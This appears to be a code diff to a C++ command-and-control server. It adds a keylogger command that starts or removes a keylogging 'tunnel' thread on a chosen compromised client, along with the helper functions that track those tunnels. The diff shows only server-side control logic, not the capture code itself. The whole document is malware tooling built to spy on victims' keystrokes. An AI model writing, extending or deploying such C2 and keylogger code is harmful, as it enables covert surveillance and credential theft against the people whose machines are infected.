@@ -68,8 +68,10 @@ CommandHandler::CommandHandler(
     std::atomic<bool>* __p_shutdown_flag,
     std::string* __p_ip,
     uint __port,
-    int* __p_user_verbosity
-    ): p_ip_(__p_ip),port_(__port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity) {
+    int* __p_user_verbosity,
+    std::vector<Tunnel>* __p_tunnels,
+    std::shared_ptr<TunnelContext> __tunnel_context
+    ): p_ip_(__p_ip),port_(__port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity), p_tunnels_(__p_tunnels), tunnel_context_(__tunnel_context) {
     
 
     argument_list_.push_back(Argument(INDEX_ARG, ARG_TYPE_INT, "-i", "--index"));
@@ -349,6 +351,56 @@ void CommandHandler::kill() {
 }
 
 void CommandHandler::keylogger() {   
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+
+    if (p_clients_->at(client_index) == nullptr || ClientHandler::is_client_up(p_clients_->at(client_index)->socket()) < 0) {
+        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Client " << client_index << " is not available" << RESET_C2_FIFO;
+        return;
+    }
+
+    Tunnel* p_tunnel = get_tunnel(client_index, KEYLOGGER);
+
+    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
+        if (p_tunnel != nullptr) {
+            uint64_t u = 1;
+            write(p_tunnel->tunnel_shutdown_fd_, &u, sizeof(u));
+            *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::keylogger] Keylogger removed from client " << client_index << RESET_C2_FIFO;
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "CommandHandler::keylogger] Keylogger is not active for client " << client_index << RESET_C2_FIFO; 
+        }
+    } else {
+        if (p_tunnel == nullptr) {
+            Keylogger* keylogger = new Keylogger();
+            p_tunnels_->emplace_back(KEYLOGGER, client_index, keylogger);
+            try {
+                p_tunnels_->back().thread_ = std::thread(&CommandHandler::handle_tunnelt, this, &p_tunnels_->back());
+            } catch (const std::system_error& e) {
+                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Error creating thread for keylogger" << RESET_C2_FIFO;
+                erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
+            }
+        }
+    }
+}
+
+void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel) {
+    __p_tunnel->p_spy_tunnel_->run();
+
+    // If we reach here, the tunnel has finished (due to error or completion) and ready to be cleaned up
+    {
+        std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
+        tunnel_context_->tunnel_queue_.push(__p_tunnel);
+        tunnel_context_->tunnel_cv_.notify_one();
+        return;
+    }
+}
+
+Tunnel* CommandHandler::get_tunnel(int __client_index, CommandCode __command_code) {
+    for (auto it=p_tunnels_->begin(); it != p_tunnels_->end(); it++) {
+        if (it->client_index_ == __client_index && it->command_code_ == __command_code) {
+            return &(*it);
+        }
+    }
+    return nullptr;
 }
 
 uint CommandHandler::find_open_port() {
